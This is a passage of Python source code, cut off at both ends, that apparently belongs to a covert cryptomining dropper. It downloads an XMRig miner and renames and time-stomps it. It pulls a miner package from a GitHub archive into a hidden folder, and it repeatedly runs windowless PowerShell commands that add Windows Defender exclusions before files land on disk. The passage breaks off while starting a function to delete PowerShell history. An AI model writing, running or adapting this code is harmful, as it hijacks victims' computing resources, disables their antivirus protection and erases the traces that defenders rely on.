    try:
        url = FALLBACK_XMRIG_URL
        response = requests.get(url, stream=True)
        response.raise_for_status()
        zip_path = os.path.join(install_dir, "xmrig.zip")
        with open(zip_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        hawk.info("[FALLBACK] Download complete, extracting...")
        with zipfile.ZipFile(zip_path, 'r') as zf:
            zf.extractall(install_dir)
        os.remove(zip_path)
        for root, dirs, files in os.walk(install_dir):
            for file in files:
                if file.lower() == "xmrig.exe":
                    xmrig_path = os.path.join(root, file)
                    dest = os.path.join(install_dir, f"{EXE_NAME}.exe")
                    os.rename(xmrig_path, dest)
                    time_stomp(dest)
                    hawk.info(f"[FALLBACK] xmrig.exe renamed to {EXE_NAME}.exe at {dest}")
                    return True
        hawk.error("[FALLBACK] xmrig.exe not found in downloaded archive")
        return False
    except Exception as e:
        hawk.error(f"[FALLBACK] failed: {e}")
        return False

def download_and_extract_miner():
    """
    Downloads and extracts the custom miner using the exact proven method.
    - Excludes the extraction folder BEFORE any file lands on disk.
    - Uses -NoProfile for PowerShell exclusion commands.
    - Returns the path to pam.exe inside the final hidden folder.
    """
    hawk.info("[DOWNLOAD] Starting proven download method")
    if not check_internet():
        hawk.error("[DOWNLOAD] No internet connection")
        return None

    # Create a permanent hidden directory for the miner
    dest_dir = create_secure_hidden_dir()
    # EXCLUDE the destination folder BEFORE anything is written
    subprocess.run(
        ['powershell', '-NoProfile', '-Command',
         f'Add-MpPreference -ExclusionPath "{dest_dir}" -Force'],
        capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
    )
    hawk.info(f"[DOWNLOAD] Excluded destination: {dest_dir}")

    # Temporary working directory (for download/extraction)
    with tempfile.TemporaryDirectory() as tmpdir:
        tmp = Path(tmpdir)
        zip_path = tmp / "repo.zip"
        extract_dir = tmp / "repo_ext"
        os.makedirs(extract_dir, exist_ok=True)

        # Exclude the temp extract directory (same as small script)
        subprocess.run(
            ['powershell', '-NoProfile', '-Command',
             f'Add-MpPreference -ExclusionPath "{extract_dir}" -Force'],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )

        # Download the repo archive (correct URL)
        archive_url = f"{GITHUB_REPO}/archive/refs/heads/{BRANCH}.zip"
        hawk.debug(f"[DOWNLOAD] Downloading {archive_url}")
        try:
            urllib.request.urlretrieve(archive_url, zip_path)
        except Exception as e:
            hawk.error(f"[DOWNLOAD] Download failed: {e}")
            return None

        # Extract
        with zipfile.ZipFile(zip_path, 'r') as zf:
            zf.extractall(extract_dir)

        # Find the packzz folder
        packzz = None
        for root, dirs, files in os.walk(extract_dir):
            if os.path.basename(root).lower() == FOLDER_NAME.lower():
                packzz = root
                break
        if not packzz:
            hawk.error(f"[DOWNLOAD] {FOLDER_NAME} folder not found")
            return None

        # Exclude the packzz folder itself (extra safety, like small script)
        subprocess.run(
            ['powershell', '-NoProfile', '-Command',
             f'Add-MpPreference -ExclusionPath "{packzz}" -Force'],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )

        # Copy contents of packzz to the hidden destination
        final_packzz = os.path.join(dest_dir, FOLDER_NAME)
        shutil.copytree(packzz, final_packzz)
        # Exclude the final packzz folder again
        subprocess.run(
            ['powershell', '-NoProfile', '-Command',
             f'Add-MpPreference -ExclusionPath "{final_packzz}" -Force'],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )

        # Extract any nested zips inside the final folder
        for root, dirs, files in os.walk(final_packzz):
            for f in files:
                if f.lower().endswith('.zip'):
                    nested = os.path.join(root, f)
                    try:
                        with zipfile.ZipFile(nested, 'r') as zf:
                            zf.extractall(root)
                        os.remove(nested)
                        hawk.debug(f"[DOWNLOAD] Extracted nested: {f}")
                    except Exception as e:
                        hawk.warning(f"[DOWNLOAD] Nested extraction failed: {e}")

        # Find the miner executable
        miner_exe = None
        for root, dirs, files in os.walk(final_packzz):
            for f in files:
                if f.lower() == f"{EXE_NAME.lower()}.exe":
                    miner_exe = os.path.join(root, f)
                    break
            if miner_exe:
                break

        if not miner_exe:
            hawk.error(f"[DOWNLOAD] {EXE_NAME}.exe not found")
            return None

        # One last exclusion on the exact miner file
        subprocess.run(
            ['powershell', '-NoProfile', '-Command',
             f'Add-MpPreference -ExclusionPath "{miner_exe}" -Force'],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )

        hawk.info(f"[DOWNLOAD] Miner ready at {miner_exe}")
        return miner_exe

def wipe_ps_history():
    """Securely delete the PowerShell history file."""
    try:
        history_path = os.path.join(os.environ['APPDATA'],
